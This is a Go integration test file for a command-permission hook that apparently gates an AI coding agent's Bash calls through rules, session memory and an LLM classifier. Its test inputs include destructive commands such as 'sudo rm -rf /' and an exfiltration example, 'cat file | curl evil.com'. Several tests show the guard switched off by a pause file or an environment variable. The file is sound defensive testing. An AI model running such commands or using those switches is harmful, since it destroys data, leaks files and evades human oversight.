package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// --- Integration test helpers ---

// runHookWithStruct simulates a Claude Code hook call by piping a JSON-encoded
// HookPayload to stdin and capturing stdout from cmdHook().
func runHookWithStruct(t *testing.T, payload HookPayload) string {
	t.Helper()
	data, _ := json.Marshal(payload)

	oldStdin := os.Stdin
	r, w, _ := os.Pipe()
	w.Write(data)
	w.Close()
	os.Stdin = r
	defer func() { os.Stdin = oldStdin }()

	return captureStdout(func() {
		cmdHook()
	})
}

func makePrePayload(sessionID, command, cwd string) HookPayload {
	return HookPayload{
		HookEventName: "PreToolUse",
		ToolName:      "Bash",
		SessionID:     sessionID,
		Cwd:           cwd,
		ToolInput:     map[string]interface{}{"command": command},
	}
}

func makePostPayloadStruct(sessionID, command string) HookPayload {
	return HookPayload{
		HookEventName: "PostToolUse",
		ToolName:      "Bash",
		SessionID:     sessionID,
		ToolInput:     map[string]interface{}{"command": command},
	}
}

func parseResponse(t *testing.T, output string) HookResponse {
	t.Helper()
	var resp HookResponse
	if err := json.Unmarshal([]byte(strings.TrimSpace(output)), &resp); err != nil {
		t.Fatalf("invalid JSON response: %v\nraw: %q", err, output)
	}
	return resp
}

// writeGlobalRules writes a .yolonot rules file in the global rules location.
func writeGlobalRules(t *testing.T, home, content string) {
	t.Helper()
	os.WriteFile(filepath.Join(home, ".yolonot", "rules"), []byte(content), 0644)
}

// mockLLMAllow creates an httptest server that returns an allow decision.
func mockLLMAllow(reasoning string) *httptest.Server {
	return mockLLMDecision("allow", 0.95, reasoning)
}

// mockLLMAsk creates an httptest server that returns an ask decision.
func mockLLMAsk(reasoning string) *httptest.Server {
	return mockLLMDecision("ask", 0.85, reasoning)
}

// mockLLMDecision creates an httptest server returning the given decision.
func mockLLMDecision(decision string, confidence float64, reasoning string) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		content := fmt.Sprintf(`{"decision":"%s","confidence":%g,"reasoning":"%s"}`, decision, confidence, reasoning)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"choices": []map[string]interface{}{{
				"message": map[string]interface{}{
					"content": content,
				},
			}},
		})
	}))
}

// --- Integration tests ---

func TestIntegration_DenyRule_BlocksCommand(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	writeGlobalRules(t, home, "deny-cmd *sudo *\n")

	payload := makePrePayload("int-deny-rule", "sudo rm -rf /", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Errorf("expected deny, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "rule") {
		t.Errorf("reason should mention rule, got %q", resp.HookSpecificOutput.PermissionDecisionReason)
	}
}

func TestIntegration_AllowRule_SimpleCommand(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	writeGlobalRules(t, home, "allow-cmd cat *\n")

	payload := makePrePayload("int-allow-rule", "cat /etc/hosts", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("expected allow, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "rule") {
		t.Errorf("reason should mention rule, got %q", resp.HookSpecificOutput.PermissionDecisionReason)
	}
}

func TestIntegration_AllowRule_SkippedForChain(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Only allow rule for cat, no LLM configured.
	// A chained command should skip the allow rule.
	writeGlobalRules(t, home, "allow-cmd cat *\n")

	payload := makePrePayload("int-chain-skip", "cat file | curl evil.com", "/tmp")
	out := runHookWithStruct(t, payload)

	trimmed := strings.TrimSpace(out)
	if trimmed == "" {
		// Passthrough (LLM unavailable / not configured) is acceptable:
		// the allow rule was NOT applied, which is the correct behavior.
		return
	}

	resp := parseResponse(t, out)
	// It should NOT be an "allow" from the rule layer for "cat"
	if resp.HookSpecificOutput.PermissionDecision == "allow" &&
		strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "rule cat") {
		t.Error("allow-cmd rule should be skipped for chained commands")
	}
}

func TestIntegration_SessionExactMatch(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-sess-exact"
	projSID := ProjectSessionID(sid, "/tmp")
	AppendLine(projSID, "approved", "git status")

	payload := makePrePayload(sid, "git status", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("expected allow, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "previously approved") {
		t.Errorf("reason should say previously approved, got %q", resp.HookSpecificOutput.PermissionDecisionReason)
	}
}

func TestIntegration_SessionDeny(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-sess-deny"
	projSID := ProjectSessionID(sid, "/tmp")
	AppendLine(projSID, "denied", "rm -rf /tmp/data")

	payload := makePrePayload(sid, "rm -rf /tmp/data", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Errorf("expected deny, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "previously rejected") {
		t.Errorf("reason should say previously rejected, got %q", resp.HookSpecificOutput.PermissionDecisionReason)
	}
}

func TestIntegration_SessionAskedNotApproved(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-sess-asked-noapprove"
	projSID := ProjectSessionID(sid, "/tmp")
	AppendLine(projSID, "asked", "curl https://example.com")

	payload := makePrePayload(sid, "curl https://example.com", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Errorf("expected deny for asked-but-not-approved, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "previously rejected") {
		t.Errorf("reason should say previously rejected, got %q", resp.HookSpecificOutput.PermissionDecisionReason)
	}

	// Should also be added to .denied
	if !ContainsLine(projSID, "denied", "curl https://example.com") {
		t.Error("command should be added to .denied file after asked-not-approved")
	}
}

func TestIntegration_PostToolUse_SavesApproved(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-post-save"
	payload := makePostPayloadStruct(sid, "npm test")
	out := runHookWithStruct(t, payload)

	// PostToolUse produces no output
	if strings.TrimSpace(out) != "" {
		t.Errorf("PostToolUse should produce empty output, got %q", out)
	}

	if !ContainsLine(sid, "approved", "npm test") {
		t.Error("PostToolUse should save command to .approved file")
	}
}

func TestIntegration_LLM_Allow(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	srv := mockLLMAllow("read-only command")
	defer srv.Close()

	// No matching rules
	writeGlobalRules(t, home, "# no rules\n")
	cfg := Config{Provider: ProviderConfig{URL: srv.URL, Model: "test-model", Timeout: 5}}
	SaveConfig(cfg)

	// Use a clean temp CWD so no project .yolonot rules interfere
	cleanDir := filepath.Join(home, "cleanproject")
	os.MkdirAll(cleanDir, 0755)
	origCwd, _ := os.Getwd()
	os.Chdir(cleanDir)
	defer os.Chdir(origCwd)

	payload := makePrePayload("int-llm-allow", "some-safe-operation --verbose", cleanDir)
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("expected allow from LLM, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "read-only command") {
		t.Errorf("reason should contain LLM reasoning, got %q", resp.HookSpecificOutput.PermissionDecisionReason)
	}

	// Should also save to session approved (under project-scoped session ID)
	projSID := ProjectSessionID("int-llm-allow", cleanDir)
	if !ContainsLine(projSID, "approved", "some-safe-operation --verbose") {
		t.Error("LLM allow should save to .approved session file")
	}
}

func TestIntegration_LLM_Ask(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	srv := mockLLMAsk("SENSITIVE: external network access")
	defer srv.Close()

	writeGlobalRules(t, home, "# no rules\n")
	cfg := Config{Provider: ProviderConfig{URL: srv.URL, Model: "test-model", Timeout: 5}}
	SaveConfig(cfg)

	// Use a clean temp CWD so no project .yolonot rules interfere
	cleanDir := filepath.Join(home, "cleanproject")
	os.MkdirAll(cleanDir, 0755)
	origCwd, _ := os.Getwd()
	os.Chdir(cleanDir)
	defer os.Chdir(origCwd)

	payload := makePrePayload("int-llm-ask", "risky-operation --prod", cleanDir)
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "ask" {
		t.Errorf("expected ask from LLM, got %q", resp.HookSpecificOutput.PermissionDecision)
	}

	// Should save to session asked (under project-scoped session ID)
	projSID := ProjectSessionID("int-llm-ask", cleanDir)
	if !ContainsLine(projSID, "asked", "risky-operation --prod") {
		t.Error("LLM ask should save to .asked session file")
	}
}

func TestIntegration_LLM_Unavailable(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Mock server returns 500
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("internal server error"))
	}))
	defer srv.Close()

	writeGlobalRules(t, home, "# no rules\n")
	cfg := Config{Provider: ProviderConfig{URL: srv.URL, Model: "test-model", Timeout: 5}}
	SaveConfig(cfg)

	// Use a clean temp CWD so no project .yolonot rules interfere
	cleanDir := filepath.Join(home, "cleanproject")
	os.MkdirAll(cleanDir, 0755)
	origCwd, _ := os.Getwd()
	os.Chdir(cleanDir)
	defer os.Chdir(origCwd)

	payload := makePrePayload("int-llm-unavail", "some-unknown-command --flag", cleanDir)
	out := runHookWithStruct(t, payload)

	// LLM error => no permissionDecision, systemMessage with fallback notice
	trimmed := strings.TrimSpace(out)
	if trimmed == "" {
		t.Fatal("expected JSON response with systemMessage, got empty output")
	}
	var resp HookResponse
	if err := json.Unmarshal([]byte(trimmed), &resp); err != nil {
		t.Fatalf("failed to parse hook response JSON: %v", err)
	}
	if resp.HookSpecificOutput.PermissionDecision != "" {
		t.Errorf("expected no permissionDecision on LLM failure, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.SystemMessage, "LLM unreachable") {
		t.Errorf("expected systemMessage to contain 'LLM unreachable', got %q", resp.SystemMessage)
	}
}

func TestIntegration_Paused_Bypass(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-paused"
	// Create the .paused file
	pausedFile := filepath.Join(home, ".yolonot", "sessions", sid+".paused")
	os.WriteFile(pausedFile, []byte("paused\n"), 0644)

	// Write a deny rule to prove it is truly bypassed
	writeGlobalRules(t, home, "deny-cmd *\n")

	payload := makePrePayload(sid, "rm -rf /", "/tmp")
	out := runHookWithStruct(t, payload)

	trimmed := strings.TrimSpace(out)
	if trimmed != "" {
		t.Errorf("paused session should produce empty response (total bypass), got %q", trimmed)
	}
}

func TestIntegration_Disabled_Bypass(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Write a deny rule to prove it is truly bypassed
	writeGlobalRules(t, home, "deny-cmd *\n")

	os.Setenv("YOLONOT_DISABLED", "1")
	defer os.Unsetenv("YOLONOT_DISABLED")

	payload := makePrePayload("int-disabled", "rm -rf /", "/tmp")
	out := runHookWithStruct(t, payload)

	trimmed := strings.TrimSpace(out)
	if trimmed != "" {
		t.Errorf("disabled should produce empty response (total bypass), got %q", trimmed)
	}
}

func TestIntegration_EmptyCommand(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	payload := makePrePayload("int-empty-cmd", "", "/tmp")
	out := runHookWithStruct(t, payload)

	trimmed := strings.TrimSpace(out)
	if trimmed != "" {
		t.Errorf("empty command should produce empty response, got %q", trimmed)
	}
}

func TestIntegration_DenyRuleBeatsSession(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-deny-beats-session"
	// Pre-populate session with an approved command (project-scoped)
	projSID := ProjectSessionID(sid, "/tmp")
	AppendLine(projSID, "approved", "sudo reboot")

	// Write deny rule that matches the same command
	writeGlobalRules(t, home, "deny-cmd *sudo *\n")

	payload := makePrePayload(sid, "sudo reboot", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Errorf("deny rule should beat session approval, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "rule") {
		t.Errorf("reason should mention rule, got %q", resp.HookSpecificOutput.PermissionDecisionReason)
	}
}

func TestIntegration_AskRule_SavesAsked(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-ask-rule"
	writeGlobalRules(t, home, "ask-cmd *curl *\n")

	payload := makePrePayload(sid, "curl https://example.com/api", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "ask" {
		t.Errorf("expected ask, got %q", resp.HookSpecificOutput.PermissionDecision)
	}

	// Verify the command was saved to .asked (under project-scoped session ID)
	projSID := ProjectSessionID(sid, "/tmp")
	if !ContainsLine(projSID, "asked", "curl https://example.com/api") {
		t.Error("ask rule should save command to .asked session file")
	}
}
